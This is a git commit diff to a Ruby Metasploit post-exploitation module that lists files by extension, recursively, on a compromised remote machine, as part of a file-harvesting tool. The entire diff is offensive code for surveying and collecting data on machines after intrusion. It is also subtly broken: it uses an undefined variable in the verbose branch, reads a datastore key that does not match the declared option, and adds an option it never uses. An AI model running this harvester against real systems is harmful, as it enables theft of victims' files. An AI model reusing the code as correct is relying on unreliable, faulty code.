311251e3d8611f7fbe0908790084d691df2f45f1
WhiteHatCode75 <lm3904@yahoo.fr>
2024-03-21 17:08:07 +0100

    [ADD] listing files on distant machine

--- files_manager.rb
+++ files_manager.rb
@@ -42,6 +42,7 @@ class MetasploitModule < Msf::Post
         OptString.new('EXTENSION', [false, 'File Extension to harvest', '']),
         OptPath.new('STARTING_POINT_PATH', [false, 'Starting point', '']),
         OptPath.new('SAVE_PATH', [false, 'path where the files will be saved.', '']),
+        OptString.new('BREAKING_POINT_FILE', [false, 'Stop when file founded', '']),
         OptBool.new('VERBOSE', [false, 'verbose mode', false]),
         OptString.new('FILE_NAME', [false, 'search a specific file', '']),
       ]
@@ -60,8 +61,7 @@ class MetasploitModule < Msf::Post
       print_error("Failed to download file: #{e.message}")
     end
   end
-    # Méthode pour récupérer les fichiers avec l'extension donnée en option
-  # on parcourt récursivement les répertoires à partir du point de départ donné en option
+  
   def get_files_list()
 
     extension = datastore['EXTENSION']
@@ -88,7 +88,52 @@ class MetasploitModule < Msf::Post
       return files
     end
 
+# Méthode pour récupérer récursivement la liste des fichiers sur la machine distante
+def list_files_distant(start_dir, extension)
+  begin
+    print_status("Retrieving files list from starting : #{start_dir}...")
+    files_list = []
+
+    # Fonction récursive pour parcourir tous les répertoires et sous-répertoires
+    recursive_list_files(start_dir, files_list, extension)
+
+    return files_list
+  rescue ::Exception => e
+    print_error("Failed to retrieve files list: #{e.message}")
+    return []
+  end
+end
+
+# Fonction récursive pour parcourir récursivement tous les répertoires et sous-répertoires
+def recursive_list_files(dir, files_list, extension)
+
+  verbose = datastore['VERBOSE']
+  # Récupérer la liste des fichiers dans le répertoire actuel
+  client.fs.dir.foreach(dir) do |entry|
+    next if entry == '.' || entry == '..'
+    full_path = "#{dir}/#{entry}"
+    if client.fs.file.stat(full_path).directory?
+      # Si c'est un répertoire, appeler récursivement la fonction pour parcourir ses fichiers
+      recursive_list_files(full_path, files_list, extension)
+      print_status("file : "+File.dirname(full_path)+File.basename(full_path))
+    elsif File.extname(full_path) == extension
+      # Si c'est un fichier, l'ajouter à la liste
+      if verbose == true
+        puts "file with "+extension+" found !"
+        puts "file : "+File.basename(file)
+      end
+      
+      files_list << full_path
+    end
+  end
+end
+
+
   def run
-    get_files_list()
+    extension = datastore['EXTENSION']
+    starting_point = datastore['STARTING_POINT']
+   
+
+    list_files_distant(starting_point, extension)
   end
 end
